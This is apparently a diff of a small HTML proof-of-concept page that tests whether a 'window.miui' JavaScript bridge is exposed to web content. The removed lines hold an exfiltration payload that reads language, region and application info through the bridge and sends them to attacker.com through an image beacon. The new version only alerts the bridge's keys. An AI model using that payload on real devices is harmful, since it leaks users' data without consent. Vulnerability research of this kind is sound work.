@@ -1,15 +1,19 @@
 <!doctype html>
 <meta charset="utf-8">
-<body>Checking...</body>
 <script>
-  (function(){
-    if (typeof window.miui === "object") {
-      let data = {};
-      try { data.lang = window.miui.getLanguage(); } catch(e){}
-      try { data.region = window.miui.getRegion(); } catch(e){}
-      try { data.appinfo = JSON.stringify(window.miui.getApplicationInfo()); } catch(e){}
-      // exfil
-      new Image().src = "https://attacker.com/leak?d=" + encodeURIComponent(JSON.stringify(data));
+(function(){
+  function safeAlert(msg){
+    try { alert(msg); } catch(e){ console.log("alert err", e); }
+  }
+
+  if (typeof window.miui === 'object') {
+    let keys = [];
+    for (let k in window.miui) {
+      keys.push(k);
     }
-  })();
+    safeAlert("miui object exposed! Keys:\n" + keys.join(", "));
+  } else {
+    safeAlert("window.miui not found");
+  }
+})();
 </script>
